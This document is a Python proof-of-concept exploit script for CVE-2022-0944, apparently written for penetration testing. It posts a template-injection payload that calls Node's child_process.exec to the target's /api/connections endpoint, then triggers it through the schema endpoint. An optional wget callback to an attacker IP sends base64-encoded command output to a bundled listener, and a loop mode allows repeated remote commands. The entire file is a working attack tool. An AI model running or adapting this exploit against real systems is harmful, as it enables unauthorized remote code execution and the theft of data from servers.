# 2xdropout 2024
# PoC exploit automation for CVE-2022-0944
# Based on exploit found here: https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb
# Written using Python 3.11.9

import argparse
import secrets
import string
import requests
import random
import socket
import threading
import base64


def decode_response(encodedValue):
    valueB64Bytes = encodedValue.encode('ASCII')
    valueBytes = base64.b64decode(valueB64Bytes)
    value = valueBytes.decode('ASCII')

    return value


def listen(verbose, port, getVar):
    print("[LISTENER] STARTING")
    host = "0.0.0.0"

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((host, int(port)))
    server_socket.listen(1)

    while True:    
        client_connection, client_address = server_socket.accept()

        request = client_connection.recv(1024).decode()

        response = 'HTTP/1.0 200 OK\n\nPWNED'
        client_connection.sendall(response.encode())
        client_connection.close()

        headers = request.split('\n')
        if(verbose):
            print("[LISTENER]", headers)
            print("[LISTENER] Parsing Request")
        
        getLine = headers[0]

        stripGETVar1 = getLine.split("?")
        stripGETVar2 = stripGETVar1[1].split("=", 1)
        if(stripGETVar2[0] == getVar):
            splitLeft = getLine.split("=", 1)
            splitRight = splitLeft[1].split(" ")

            encodedString = splitRight[0]

            if(verbose):
                print("[LISTENER] Encoded String:  " + encodedString)

            print("[COMMAND RESPONSE]:\n" + decode_response(encodedString))
            break

        elif(stripGETVar2[0] != getVar):
            if(verbose):
                print("[LISTENER] Recieved the wrong GET Variable:  " + stripGETVar2[0] + "\n-> Expected:  " + getVar)

    server_socket.close()


def create_rand_String():
    var = ''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(random.randrange(7,21,1)))
    return var


def send(verbose, url, payload, maxTimeout):
    print("[SENDER] STARTING")
    apiEndpoint = url + "/api/connections"
    nameVar = create_rand_String()

    if(verbose):
        print("[SENDER] PAYLOAD IN TRANSIT")
        print("[SENDER] CONFIG:\n---> API Endpoint:  " + apiEndpoint + "\n---> Connection Name:  " + nameVar)
    
    response = requests.post(apiEndpoint, json = {"name":nameVar,"driver":"mysql","data":{"database":payload}}, timeout = maxTimeout)
    
    if(response.status_code != 200):
        print("BAD STATUS CODE" + str(response.status_code))
        exit()
    else:
        respJson = response.json()
        if(verbose):
            print('[SENDER] Succesfull Connection!')
            print("[SENDER RESPONSE] POST Response Status Code:  " + str(response.status_code))
            print("[SENDER RESPONSE] Response Text:  " + response.text)
            print("[SENDER RESPONSE] API Connection ID:  " + respJson["id"])

    schemeaEndpoint = apiEndpoint + "/" + respJson["id"] + "/schema"

    if(verbose):
        print("[SENDER] Sending GET request to schema endpoint:  " + schemeaEndpoint)
    schemaResponse = requests.get(schemeaEndpoint, timeout = maxTimeout)


def pwn(verbose, url, maxTimeout, attackerIP, port, callBackBin, command, needListener):
    if(verbose):
        print("-> CONFIG:\n--> URL:  " + url + "\n--> Max Timeout:  " + str(maxTimeout))

    if(needListener):
        getVar = create_rand_String()
        callBack = callBackBin + " http://" + attackerIP + ":" + str(port) + "/?" + getVar + "=$(" + command + " | base64)"
        payload = "{{ process.mainModule.require('child_process').exec('" + callBack + "') }}"
    else:
        payload = "{{ process.mainModule.require('child_process').exec('" + command + "') }}"

    if(verbose):
        print("--> Test Payload:  " + payload)
    
    if(needListener):
        listenerThread = threading.Thread(target = listen, args = (verbose, port, getVar))
        listenerThread.start()
    
    senderThread = threading.Thread(target = send, args = (verbose, url, payload, maxTimeout))
    senderThread.start()

    senderThread.join()

    if(needListener):
        listenerThread.join()


parser = argparse.ArgumentParser(
                    prog='exploit.py',
                    description='PoC for CVE-2022-0944',
                    epilog='Written with love by 2xdropout and based on exploit found here: https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb')

parser.add_argument('URL', help = 'Target URL')
parser.add_argument('ip', help = 'Attacker ip')
parser.add_argument('-c', '--command', help = 'Command to run on target')
parser.add_argument('-l', '--listen', default = False, action = 'store_true', help = 'Listen for a command response')
parser.add_argument('-p', '--port', default = 8080, help = 'Port for the webserver to listen on (default:8080)')
parser.add_argument('--callback-command', default = 'wget', help = 'Set the command used to call back to the web server (default:wget)')
parser.add_argument('-v', '--verbose', default = False, action = 'store_true', help = 'Enable verbose logging')
parser.add_argument('-t', '--max-timeout', default = 10, help = 'Set the maximum timeout (default:10s)')
parser.add_argument('--loop', default = False, action = 'store_true', help = 'Run multiple commands without needing to restart exploit. NOT A FULL SHELL')

args = parser.parse_args()

pwn(args.verbose, args.URL, args.max_timeout, args.ip, args.port, args.callback_command, args.command, args.listen)

if(args.loop):
    while True:
        args.command = input("$ ")
        pwn(args.verbose, args.URL, args.max_timeout, args.ip, args.port, args.callback_command, args.command, args.listen)

